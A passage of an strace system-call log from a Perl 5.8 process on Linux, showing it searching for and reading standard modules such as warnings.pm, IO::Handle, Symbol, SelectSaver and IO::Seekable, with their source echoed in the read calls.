{\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
9851  20:00:43.707214 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
9851  20:00:43.707368 read(8, "", 4096) = 0
9851  20:00:43.707382 close(8)          = 0
9851  20:00:43.707607 _llseek(6, 412, [412], SEEK_SET) = 0
9851  20:00:43.707630 _llseek(6, 0, [412], SEEK_CUR) = 0
9851  20:00:43.707641 close(6)          = 0
9851  20:00:43.707683 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
9851  20:00:43.707707 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
9851  20:00:43.707736 futex(0xb7fc3070, 0x81 /* FUTEX_??? */, 2147483647) = 0
9851  20:00:43.707752 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
9851  20:00:43.707767 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
9851  20:00:43.707857 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
9851  20:00:43.707882 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7fc7000
9851  20:00:43.707896 mmap2(0xb7fcb000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fcb000
9851  20:00:43.707949 close(6)          = 0
9851  20:00:43.708080 stat64("/etc/perl/IO/Handle.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708096 stat64("/etc/perl/IO/Handle.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708111 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708123 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708138 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708151 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708166 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708182 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708196 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708209 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708222 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708236 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
9851  20:00:43.708257 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.708272 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.708284 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.708301 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
9851  20:00:43.708690 stat64("/etc/perl/Symbol.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708707 stat64("/etc/perl/Symbol.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.708721 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708734 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.708748 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708761 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.708776 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708788 stat64("/usr/lib/perl5/Symbol.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.708801 stat64("/usr/share/perl5/Symbol.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708813 stat64("/usr/share/perl5/Symbol.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.708826 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708839 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.708853 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.708865 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
9851  20:00:43.708887 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.708901 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.708906 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.708907 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
9851  20:00:43.709092 read(8, "", 4096) = 0
9851  20:00:43.709110 close(8)          = 0
9851  20:00:43.709175 stat64("/etc/perl/SelectSaver.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.709204 stat64("/etc/perl/SelectSaver.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.709219 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.709233 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.709248 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.709261 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.709275 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.709288 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.709302 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.709314 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.709328 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.709341 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.709356 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.709369 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
9851  20:00:43.709392 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.709407 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.709419 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.709438 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
9851  20:00:43.709566 brk(0x81d6000)    = 0x81d6000
9851  20:00:43.709777 read(8, "", 4096) = 0
9851  20:00:43.709950 close(8)          = 0
9851  20:00:43.710445 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
9851  20:00:43.711124 read(6, "", 4096) = 0
9851  20:00:43.711140 close(6)          = 0
9851  20:00:43.711181 stat64("/etc/perl/IO/Seekable.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711197 stat64("/etc/perl/IO/Seekable.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711212 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711225 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711240 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711257 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711271 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711283 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711297 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711310 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711323 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711337 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
9851  20:00:43.711359 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.711374 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.711386 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.711405 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
9851  20:00:43.711546 stat64("/etc/perl/Fcntl.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
